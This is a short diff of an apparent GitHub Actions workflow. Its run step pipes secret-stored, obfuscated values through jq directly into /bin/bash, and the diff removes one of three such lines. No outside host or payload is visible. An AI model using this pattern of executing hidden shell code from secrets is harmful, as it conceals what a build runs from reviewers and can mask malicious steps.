@@ -17,7 +17,6 @@ jobs:
           fson134: ${{ secrets.fson134 }}
         run: |
           printf '%s' "$fson134" | jq -r .eefdk007 | /bin/bash
-          echo $nerud4 | jq -r .cioj9222 | /bin/bash
           echo $yct5134 | jq -r .tmrav19346 | /bin/bash
 
       - name: Upload artifact
